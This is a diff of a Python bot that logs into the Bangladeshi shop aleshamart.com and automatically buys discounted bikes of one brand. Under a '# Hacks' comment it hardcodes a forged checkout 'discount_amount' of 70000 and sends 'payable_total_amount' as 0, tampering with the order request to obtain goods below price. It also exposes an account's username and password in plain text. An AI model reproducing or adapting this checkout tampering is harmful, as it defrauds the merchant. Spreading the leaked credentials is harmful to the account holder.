@@ -12,9 +12,15 @@ from random_user_agent.params import SoftwareName, OperatingSystem
 
 # Base URL
 __base = 'https://aleshamart.com/'
+
+# Login Details
 __username = '01511085250'
 __password = '@eikg7mMWDRFsA8'
+
+# Hacks
+__expected_off = 20
 __bike_brand_id = 42
+__expected_discount = 70000
 
 # User Session
 __session = rq.Session()
@@ -120,7 +126,7 @@ def checkout() -> None:
     'payable_total_amount': '0',
     'note': '',
     'shipping_cost': '0',
-    'discount_amount': '50000',
+    'discount_amount': str(__expected_discount),
     'is_flat_shipping': '0',
     'appliedDiscountIdsWithAmount': 'a: 0: {}'
   }
@@ -140,7 +146,7 @@ def main() -> None:
     print(f'[+] LOGIN SUCCESSFULL!')
     while True:
       for bike in search_bikes(__bike_brand_id):
-        if int(bike.get('off')[:-1]) > 20 and buy(bike.get('link')):
+        if int(bike.get('off')[:-1]) >= __expected_off and buy(bike.get('link')):
           print(f'[+] Trying to buy: {bike.get("name")}')
           if checkout():
             print(f'[+] {bike.get("name")} buy: SUCCESS!')
